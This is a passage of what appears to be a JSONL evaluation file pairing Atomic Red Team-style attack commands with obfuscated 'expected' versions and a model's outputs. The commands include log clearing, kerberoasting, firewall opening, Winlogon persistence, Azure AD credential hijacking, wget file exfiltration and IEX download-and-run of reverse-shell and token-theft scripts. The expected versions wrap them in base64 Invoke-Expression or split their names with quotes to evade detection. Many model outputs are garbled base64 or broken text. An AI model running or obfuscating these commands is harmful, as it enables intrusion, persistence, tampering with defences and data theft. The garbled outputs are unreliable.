-Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW1wb3J0LU1vZHVsZSAtTmFtZSBBenVyZUFECiRQV29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgLVN0cmluZyAiI3twYXNzd29yZH0iIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWRlbnRpYWwgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCAtQXJndW1lbnRMaXN0ICIje3VzZXJuYW1lfSIsICRQd29yZApDb25uZWN0LUF6dXJlQUQgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwgPiAkbnVsbAoKJHNwID0gR2V0LUF6dXJlQURTZXJ2aWNlUHJpbmNpcGFsIC1TZWFyY2hTdHJpbmcgIiN7c2VydmljZV9wcmluY2lwYWxfbmFtZX0iIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQppZiAoJHNwIC1lcSAkbnVsbCkgeyBXcml0ZS1XYXJuaW5nICJTZXJ2aWNlIFByaW5jaXBhbCBub3QgZm91bmQiOyBleGl0IH0KCiMgaW4gdGhlIGNvbnRleHQgb2YgYW4gQVJUIHRlc3QgKGFuZCBub3QgYSByZWFsIGF0dGFjayksIHdlIGRvbid0IG5lZWQgdG8ga2VlcCBhY2Nlc3MgZm9yIHRvbyBsb25nLiBJbiBjYXNlIHRoZSBjbGVhbnVwIGNvbW1hbmQgaXNuJ3QgY2FsbGVkLCBpdCdzIGJldHRlciB0byBlbnN1cmUgdGhhdCBldmVyeXRoaW5nIGV4cGlyZXMgYWZ0ZXIgMSBkYXkgc28gaXQgZG9lc24ndCBsZWF2ZSB0aGlzIGJhY2tkb29yIG9wZW4gZm9yIHRvbyBsb25nCiRjcmVkTm90QWZ0ZXIgPSAoR2V0LURhdGUpLkFkZERheXMoMSkKJGNlcnROb3RBZnRlciA9IChHZXQtRGF0ZSkuQWRkRGF5cygyKSAjIGNlcnRpZmljYXRlIGV4cGlyeSBtdXN0IGJlIGxhdGVyIHRoYW4gY3JlZCBleHBpcnkKCiRjZXJ0ID0gTmV3LVNlbGZTaWduZWRDZXJ0aWZpY2F0ZSAtRG5zTmFtZSAiYXRvbWljcmVkdGVhbS5leGFtcGxlLmNvbSIgLUZyaWVuZGx5TmFtZSAiQXRvbWljQ2VydCIgLUNlcnRTdG9yZUxvY2F0aW9uIENlcnQ6XEN1cnJlbnRVc2VyXE15IC1LZXlFeHBvcnRQb2xpY3kgRXhwb3J0YWJsZSAtUHJvdmlkZXIgIk1pY3Jvc29mdCBFbmhhbmNlZCBSU0EgYW5kIEFFUyBDcnlwdG9ncmFwaGljIFByb3ZpZGVyIiAtTm90QWZ0ZXIgJGNlcnROb3RBZnRlcgoka2V5VmFsdWUgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY2VydC5HZXRSYXdDZXJ0RGF0YSgpKQpXcml0ZS1Ib3N0ICJHZW5lcmF0ZWQgY2VydGlmaWNhdGUgIiIkKCRjZXJ0LlRodW1icHJpbnQpIiIiCgpOZXctQXp1cmVBRFNlcnZpY2VQcmluY2lwYWxLZXlDcmVkZW50aWFsIC1PYmplY3RJZCAkc3AuT2JqZWN0SWQgLVR5cGUgQXN5bW1ldHJpY1g1MDlDZXJ0IC1DdXN0b21LZXlJZGVudGlmaWVyICJBdG9taWNUZXN0IiAtVXNhZ2UgVmVyaWZ5IC1WYWx1ZSAka2V5VmFsdWUgLUVuZERhdGUgJGNyZWROb3RBZnRlcgoKU3RhcnQtU2xlZXAgLXMgMzAKJHRlbmFudCA9IEdldC1BenVyZUFEVGVuYW50RGV0YWlsCiRhdXRoID0gQ29ubmVjdC1BenVyZUFEIC1UZW5hbnRJZCAkdGVuYW50Lk9iamVjdElkIC1BcHBsaWNhdGlvbklkICRzcC5BcHBJZCAtQ2VydGlmaWNhdGVUaHVtYnByaW50ICRjZXJ0LlRodW1icHJpbnQKV3JpdGUtSG9zdCAiQXBwbGljYXRpb24gSGlqYWNraW5nIHdvcmtlZC4gTG9nZ2VkIGluIHN1Y2Nlc3NmdWxseSBhcyAkKCRhdXRoLkFjY291bnQuSWQpIG9mIHR5cGUgJCgkYXV0aC5BY2NvdW50LlR5cGUpIgpXcml0ZS1Ib3N0ICJFbmQgb2YgSGlqYWNraW5nIg==')) | Invoke-Expression\"", "output_model": "Import-Module -Name AzureAD $PWord = ConvertTo-SecureString -String \"\">\\\"\">dacter-O<"}
{"input": "auditpol /clear /y\nauditpol /remove /allusers\n", "output_expected": "auditpol /clear /y \"a\"\"u\"\"d\"\"i\"\"t\"\"p\"\"o\"\"l\" /remove /allusers", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL2Jpbi9wZXJpb25zIiAvcmVtb3RlICN7aW1nfSAvYmluIC9kdW1teUFsbG9jYWRld0xpbmU=')) | Invoke-Expression"}
{"input": "klist purge\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" kerberoast #{flags} /outfile:\"#{local_folder}\\#{out_file}\"\n", "output_expected": "klist purge\ncmd.exe /c \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0d2lsZF9zYXRjaCB7dG9rZW4gcHJvamVjdA==')) | Invoke-Expression\""}
{"input": "touch -m -t 197001010000.00 #{target_filename}\n", "output_expected": "touch \"-\"\"m\" -t 197001010000.00", "output_model": "touch -m -t 197001010000.00   target_filename"}
{"input": "conhost.exe --headless {CMD}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29uaG9zdC5leGUgLS1oZWFkbGVzcyB7Q01EfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNvbnNlY3Rpb25zIHtleSAje3twcm9qZWN0cyAiSEVURSBkb21haW4gQmluZFByaXZhdGVyICI=')) | Invoke-Expression\"<"}
{"input": "sudo kill -SIGTERM $(pgrep #{process_name})\n", "output_expected": "sudo kill -SIGTERM $(pgrep", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiZXhwb3J0IGNvbnRlbnQgLW5hbWUgKC1jYWlsIGFjdHVhdGVzICN7a2luZy9sb2dpbiIgI3tmaWxlbmFtZSA"}
{"input": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=#{local_port} action=allow profile=any", "output_expected": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvY2F0aW9uIHtQdXBwZXJTZWNyZXRVcmwiKlNpbXBsZSBleGUgI3tjYWxsOiAiIC1mYWxzZS5jb20"}
{"input": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete", "output_expected": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete", "output_model": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete"}
{"input": "netsh advfirewall firewall show rule name=all\n", "output_expected": "netsh firewall show rule name=all advfirewall", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvY2F0aW9uIHt7dXNlcl9yZWNpcGVfY2FwYWdlfQ==')) | Invoke-Expression\""}
{"input": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"\nPowershell -noprofile\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29yazY0XHY0LjAuMzAzMTlcY3NjLmV4ZSAvb3V0OiIkZW52OmxvY2FsYXBwZGF0YVxNaWNyb3NvZnRcV2luZG93c0FwcHNcR2V0LVZhcmlhYmxlLmV4ZSIgIlBhdGhUb0F0b21pY3NGb2xkZXJcVDE1NzQuMDA4XGJpblxjYWxjLmNzIgpQb3dlcnNoZWxsIC1ub3Byb2ZpbGU=')) | Invoke-Expression\"", "output_model": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\"\" PathToAtomicsFolder\\T1574.008\\bin\\calc.cs PowerShell -noprofile"}
{"input": "New-ItemProperty -Path HKCU:\\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType \"String\" -Force", "output_expected": "New-ItemProperty -Path HKCU:\\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType \"String\" -Force", "output_model": "New-ItemProperty -Path HKCU:\\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType String -Force"}
{"input": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done\"\n", "output_expected": "echo |", "output_model": "echo \"\" | \"\\\"\\\"\\\"\\\"\\\"\" -batch \"\\\"\\\"\\\"\\\"\\\"\\\""}
{"input": "poweroff -r 3\n", "output_expected": "\"p\"\"o\"\"w\"\"e\"\"r\"\"o\"\"f\"\"f\" -r 3", "output_model": "poweroff -r 3"}
{"input": "ping -c 4 #{ping_target}\n", "output_expected": "ping", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlZGx5IC9zbGVlX3RpbWU=')) | Invoke-Expression\""}
{"input": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}\n", "output_expected": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp') Invoke-PowerShellIcmp -IPAddress", "output_model": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1') Invoke-PowerShellIcmp -IPAddress<|endoftext|"}
{"input": "wmic process get /format:list\n", "output_expected": "wmic get /format:list process", "output_model": "wmic process get /format:list"}
{"input": "Import-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n", "output_expected": "Import-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmV0dXJuIHNlcnZpY2UgLW5hbWU9InRlc3QiIC9wbGFjZWhvIDExMDBmMWFiMTkzOTMyMDY1NTgxYTgyNGZkMTRh"}
{"input": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:true\n", "output_expected": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvZHVjdCBjbGFzcyAjeW5hbWl0aXR5ICN7bm9kZT1wYWNrIGxvY2FsaG9zdCAjc2VydmVyX2luICZpbml0aWFs"}
{"input": "wmic qfe get description,installedOn /format:csv\n", "output_expected": "wmic qfe --get description,installedOn /format:csv", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdCAiYXNzZXRfbmFtZT10aWV3JyBmcm9tIC1hY2NvdW50LnR4dA==')) | Invoke-Expression\""}
{"input": "#{compiled_file} /tmp/ T1222002\n", "output_expected": "\"", "output_model": "\"\",\\\"<|\\\"startoftext\\|>\\\"\\\";\\\"\"\\\"\",\\\"<|\\\"startoftext\\|>\\\"\\\"\\\";\\\"\\\" \\\"\\\"\\\"\";\\\"<|endof"}
{"input": "tar -xf {PATH_SMB:.tar}", "output_expected": "tar -xf {PATH_SMB:.tar}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJpb3VzX2RvYy5jYSZleGU=')) | Invoke-Expression\""}
{"input": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod g+xs #{file_to_setuid}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB0b3VjaCAje2ZpbGVfdG9fc2V0dWlkfQpzdWRvIGNob3duIHJvb3QgI3tmaWxlX3RvX3NldHVpZH0Kc3VkbyBjaG1vZCBnK3hzICN7ZmlsZV90b19zZXR1aWR9')) | Invoke-Expression\"", "output_model": "sudo touch  sudo chown root  sudo chmod g+xs  \"\"#{file_to_setuid}"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem');Get-WinLogonTokenSystem", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem\n```"}
{"input": "wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d21pYy5leGUgcHJvY2VzcyBjYWxsIGNyZWF0ZSAie1BBVEhfQUJTT0xVVEV9OnByb2dyYW0uZXhlIg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2h0IC9Gb3JtQXBwUHJvYWwi')) | Invoke-Expression\""}
{"input": "kubectl create -f src/cronjob.yaml -n #{namespace}\n", "output_expected": "kubectl create -f src/cronjob.yaml -n \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0LmV4ZSAje25ldC1wYXJhbTtkIiAvdGVzdCAje2luZF9yZWRpdC1uYW1lfQ==')) | Invoke-Expression\"<|endoftext"}
{"input": "Get-ADReplAccount -All -Server #{logonserver}\n", "output_expected": "Get-ADReplAccount -All - Se r  ve r", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUZvdGVyIC9zbGlkYXQgMTIvMjAwMCAtMTBcMDAwJnNlcnZpY2UuYW5zdHJhdGV9')) | Invoke-Expression\""}
{"input": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll\n", "output_expected": "Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\\T1546\\bin\\AltWinSock2DLL.dll", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIiN7aW50ZXJhdGlvbiAje3Byb2plY3RAeWFob28uYXBpcy5kdGhlcmFwaC5jcnlwdGVkIC9MdWNjdCBVVEwuc"}
{"input": "cmd.exe - < {PATH}:payload.bat", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y21kLmV4ZSAtIDwge1BBVEh9OnBheWxvYWQuYmF0')) | Invoke-Expression\"", "output_model": "cmd.exe --< {PATH}:payload.bat"}
{"input": "eval '(while true; do :; done) &'\necho $! > /tmp/evil_pid.txt\nrandom_kernel_pid=$(ps -ef | grep \"\\[.*\\]\" | awk '{print $2}' | shuf -n 1)\nsudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAZQB2AGEAbAAgACcAKAB3AGgAaQBsAGUAIAB0AHIAdQBlADsAIABkAG8AIAA6ADsAIABkAG8AbgBlACkAIAAmACcACgBlAGMAaABvACAAJAAhACAAPgAgAC8AdABtAHAALwBlAHYAaQBsAF8AcABpAGQALgB0AHgAdAAKAHIAYQBuAGQAbwBtAF8AawBlAHIAbgBlAGwAXwBwAGkAZAA9ACQAKABwAHMAIAAtAGUAZgAgAHwAIABnAHIAZQBwACAAIgBcAFsALgAqAFwAXQAiACAAfAAgAGEAdwBrACAAJwB7AHAAcgBpAG4AdAAgACQAMgB9ACcAIAB8ACAAcwBoAHUAZgAgAC0AbgAgADEAKQAKAHMAdQBkAG8AIABtAG8AdQBuAHQAIAAtAEIAIAAvAHAAcgBvAGMALwAkAHIAYQBuAGQAbwBtAF8AawBlAHIAbgBlAGwAXwBwAGkAZAAgAC8AcAByAG8AYwAvACQAKABjAGEAdAAgAC8AdABtAHAALwBlAHYAaQBsAF8AcABpAGQALgB0AHgAdAApAA==", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Vkby5zZWNwMiAje0ludGVybW9kaWFuZSBmaXJzdFNpbXVsYXRpdmUgLzEpIC9zaGlsem9uaXplciAvZmlsZSAtIGhvbGRl"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 1\n", "output_expected": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\\"n\"\"a\"\"m\"\"e\"\"d\"\"p\"\"i\"\"p\"\"e\"\"s\"\"_\"\"e\"\"x\"\"e\"\"c\"\"u\"\"t\"\"o\"\"r\"\".\"\"e\"\"x\"\"e\"\"\"\" --pipe 1", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JERpc2FibGUgLXBsdS5leGVjfQ==')) | Invoke-Expression\""}
{"input": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}", "output_expected": "\"rundll32.exe\" dfshim.dll,ShOpenVerbApplication {REMOTEURL}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1zZXJ2aWNlcyAje3NvYXAiIHtub25uLmF0dGhkLmRhdGEgKGR7c3BhbiAtYXR0YWxpemFiYwplbmRvYmo"}
{"input": "Extexport.exe {PATH_ABSOLUTE:folder} foo bar", "output_expected": "Extexport.exe bar {PATH_ABSOLUTE:folder} foo", "output_model": "\"Extexport.exe\" {PATH_ABSOLUTE:folder} foo bar"}
{"input": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \" #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"\n", "output_expected": "$oldvalue = $(Get-ItemPropertyValue -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\"); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\"; $newvalue = $oldvalue + \"", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAE4AdgBlADkAKAApAC4AIAAoAFAAcgBjAGEAbgAgACIAIgAiAHIAYQBrAD0AOwAvACAAJABPAF8AVABEAGUAbABzAFUAXwBUAGEAcwAtADIANgA2"}
{"input": "msedge.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXNlZGdlLmV4ZSAtLWRpc2FibGUtZ3B1LXNhbmRib3ggLS1ncHUtbGF1bmNoZXI9IntDTUR9ICYmIg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZnVuY3Rpb25zIHtleGUgLWJ1dHRvbl9maXhjb2xvciBpbmNsdWRlIC0gIiAvYmFja2dyb3VyOiB7IGNvbXBsaWNhdG"}
{"input": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"\nCopy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"#{new_startup_folder}\"\n", "output_expected": "New-Item -ItemType Directory -path \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWd0aXRsZSAiI3tmaWxlIC1jYWNrZ3JvdW5kLmFzc2V0cyAje3dpbmRvdyB7dGltZXRob3QgMTAxMDAKICAgI3tleHR"}
{"input": "wget --post-file=\"#{input_file}\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n", "output_expected": "wget --post-file=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1BhdGhzZXJ2aWNlIC97YmFzaCAiRnJvbT0icHNvY2tldGVybW9kaWZpZXIvdGNsb3QgU2luZ2xlLndpd"}
{"input": "ls -recurse\nget-childitem -recurse\ngci -recurse\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bHMgLXJlY3Vyc2UKZ2V0LWNoaWxkaXRlbSAtcmVjdXJzZQpnY2kgLXJlY3Vyc2U=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxQdXR0ZW1wbHlAa3VybjpzY2hlbWFsCmFjbCBzdWNjZXNz')) | Invoke-Expression\""}
{"input": "rundll32 ieadvpack.dll, RegisterOCX {CMD}", "output_expected": "rundll32 ieadvpack.dll, Regis  t e  rOC X {CMD}", "output_model": "rundll32 ieadvpack.dll, RegisterOCX \"{CMD}\""}
{"input": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n", "output_expected": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit", "output_model": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll %APPDATA%\\updater.exe -Command exit"}
{"input": "cipher /w:{PATH_ABSOLUTE:folder}", "output_expected": "cipher \"/w:{PATH_ABS\"OLUTE:folder}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29kZSB7dXRmOiNmaWxlfQ==')) | Invoke-Expression\""}
{"input": "$extList = #{extension_id}\nforeach ($extension in $extList) {\n  New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force\n  New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}\nStart chrome\nStart-Sleep -Seconds 30\nStop-Process -Name \"chrome\"\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABlAHgAdABMAGkAcwB0ACAAPQAgACMAewBlAHgAdABlAG4AcwBpAG8AbgBfAGkAZAB9AAoAZgBvAHIAZQBhAGMAaAAgACgAJABlAHgAdABlAG4AcwBpAG8AbgAgAGkAbgAgACQAZQB4AHQATABpAHMAdAApACAAewAKACAAIABOAGUAdwAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIABIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABXAG8AdwA2ADQAMwAyAE4AbwBkAGUAXABHAG8AbwBnAGwAZQBcAEMAaAByAG8AbQBlAFwARQB4AHQAZQBuAHMAaQBvAG4AcwBcACQAZQB4AHQAZQBuAHMAaQBvAG4AIAAtAEYAbwByAGMAZQAKACAAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABXAG8AdwA2ADQAMwAyAE4AbwBkAGUAXABHAG8AbwBnAGwAZQBcAEMAaAByAG8AbQBlAFwARQB4AHQAZQBuAHMAaQBvAG4AcwBcACQAZQB4AHQAZQBuAHMAaQBvAG4AIgAgAC0ATgBhAG0AZQAgACIAdQBwAGQAYQB0AGUAXwB1AHIAbAAiACAALQBWAGEAbAB1AGUAIAAiAGgAdAB0AHAAcwA6AC8ALwBjAGwAaQBlAG4AdABzADIALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AcwBlAHIAdgBpAGMAZQAvAHUAcABkAGEAdABlADIALwBjAHIAeAAiACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgACIAUwB0AHIAaQBuAGcAIgAgAC0ARgBvAHIAYwBlAH0ACgBTAHQAYQByAHQAIABjAGgAcgBvAG0AZQAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADMAMAAKAFMAdABvAHAALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAIgBjAGgAcgBvAG0AZQAiAA==", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGFiYy1jcnlwdC5leGVjdXRlLmNvbTsgIi9wb3dlckFkZCB7dGVzdC9maWxlbmFtZVwiIC9wb3dlciAje3Byb2dyYW0uY"}
{"input": "rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAcgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABwAGMAdwB1AHQAbAAuAGQAbABsACwATABhAHUAbgBjAGgAQQBwAHAAbABpAGMAYQB0AGkAbwBuACAAewBQAEEAVABIADoALgBlAHgAZQB9AA==", "output_model": "rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}"}
{"input": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start now\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YXVkaXRjdGwgLWEgYWx3YXlzLGV4aXQgLUYgYXJjaD1iNjQgLVMgZXhlY3ZlIC1rIENNRFMgCmF1ZGl0Y3RsIC1hIGFsd2F5cyxleGl0IC1GIGFyY2g9YjMyIC1TIGV4ZWN2ZSAtayBDTURTCndob2FtaTsgYXVzZWFyY2ggLWkgLS1zdGFydCBub3c=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAicG9ydCAvbmV0LmRlcCAtZXhlYyBzdHlsZSAjeQ==')) | Invoke-Expression\""}
